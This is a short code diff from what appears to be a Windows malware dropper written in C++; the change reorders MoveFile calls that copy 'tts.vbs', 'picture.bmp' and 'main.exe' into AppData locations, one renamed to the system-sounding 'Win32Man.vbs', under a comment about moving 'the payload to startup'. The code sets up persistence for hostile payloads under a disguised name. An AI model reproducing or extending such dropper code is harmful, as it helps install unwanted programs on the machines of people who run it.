@@ -41,10 +41,10 @@ int main(int argc, char* argv[])
 	ttsDirectory += "\\AppData\\Local\\Win32Man.vbs";
 
 	// move the payload to startup
+	MoveFile("tts.vbs", ttsDirectory.c_str());
 	MoveFile("picture.bmp", pictureDirectory.c_str());
 	MoveFile("main.exe", newPayloadDirectory.c_str());
 	MoveFile("main.exe", otherPayloadDirectory.c_str());
-	MoveFile("tts.vbs", ttsDirectory.c_str());
 	
 	return 0;
 }
